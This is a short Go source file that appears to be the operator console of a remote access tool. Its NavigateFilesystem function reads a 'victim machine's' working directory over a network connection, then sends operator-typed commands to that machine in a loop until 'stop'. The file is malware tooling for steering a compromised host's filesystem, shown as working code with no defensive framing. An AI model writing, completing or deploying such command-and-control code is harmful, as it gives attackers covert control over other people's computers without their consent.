package Move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func NavigateFilesystem(connection net.Conn) (err error) {

	ConnectionReader := bufio.NewReader(connection)

	initial_pwd_raw, err := ConnectionReader.ReadString('\n')

	initial_pwd := strings.TrimSuffix(initial_pwd_raw, "\n")

	loopControl := true

	for loopControl {
		fmt.Print(initial_pwd, " >> ")

		CommandReader := bufio.NewReader(os.Stdin)

		user_command_raw, err := CommandReader.ReadString('\n')
		if err != nil {
			fmt.Println("[+] Unable to read command")
		}
		nbytes, err := connection.Write([]byte(user_command_raw))
		fmt.Println("[+] ", nbytes, " were sent to the victim machine ")

		if user_command_raw == "stop\n" {
			loopControl = false
			break
		}

		new_pwd, err := ConnectionReader.ReadString('\n')
		fmt.Println("[+] Working Directory changed to ", new_pwd)
		initial_pwd = new_pwd
	}
	return
}
